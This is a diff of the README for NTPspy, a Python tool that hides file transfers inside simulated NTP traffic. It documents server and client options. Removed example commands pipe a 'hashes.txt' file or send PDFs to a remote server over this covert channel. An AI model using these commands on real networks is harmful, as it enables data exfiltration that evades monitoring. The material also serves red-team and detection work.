@@ -1,41 +1,43 @@
 # NTPspy - data tunneling over NTP
 
-Transfer files disguised in simulated NTP traffic.
+Transfer files disguised in simulated NTP traffic.  
+
+## System Requirements
+
+- Python 3.7 or later
 
 ## Usage
 
-**Quick start:**
+`python ntpspy.py -h` for usage help (options, flags, and modes)
 
-Choose a port, default standard NTP 123, and magic number - any 32bit hex number besides zero and start NTPspy in server mode.
+### Server Mode
 
-Use the same port and magic number to invoke the client with a filename, list of filenames, or piped input. Use -t n to set minimum time interval between messages in seconds.
+`python ntpspy.py [-m magic] [-s storage_path]` will run the program in server mode and store the transferred files with in the provided storage path
 
-See built-in -h help for complete options.
+`python ntpspy.py [-m magic] [-s storage_path] [-o]` allows overwriting existing files, else duplicate files will be automatically renamed
 
-**Server mode:**
+`python ntpspy.py [-m magic] [-s storage_path] [-p Port]` will run the program in server mode and with a selected port, default 123
 
-`ntpspy.py -s <path> [-p port] [-m magic]`
+### Client Mode
 
-`ntpspy.py -s "./incoming" -p 1230 -m 0xfefefefe`
+`python ntpspy.py [-q] [-m magic] remote` queries the server to check the presence of NTPspy and protocol version using the specified magic number. The program will exit after the query is complete.
 
-**Client:**
+`python ntpspy.py [-p Port] [-m magic] remote [file ...]` will run a client instance of the program transferring the designated file(s) to the remote host
 
-`ntpspy.py [-p port] [-m magic] remote filename [filename ... ]`
+- port number can also be set using the *host:port* convention
+- without filename, will read from stdin
 
-`ntpspy.py -m 0xfefefefe remote:1230 *.pdf`
+`python ntpspy.py [-t Time_interval] remote [file ...]` sends the specified file(s) to the remote host, but with minimum interval (in seconds) between datagrams
 
-`cat hashes.txt | ntpspy.py -m 0xfefefefe -p 1230 remote`
+### Arguments Across both Server and Client
 
-Other options:
+`-m magic_number` this value is set to differentiate the sent messages from typical NTP traffic
 
-- -t Minimum interval between messages
-- -q Just query server version/confirm NTPspy presence and exit
+	- the higher the value, the less chance of a normal NTP datagram being processed as a NTPspy message
 
-## System requirements
-
-Python 3.7
+`-v` verbose mode, increase level of log detail
 
 ## Known limits/issues
 
-Don't have multiples server instances pointed at same store directory - they will overwrite each other's temporary files.
+- Multiple instances of the server running and saving to the same directory will overwrite each other's temporary buffer files.
 
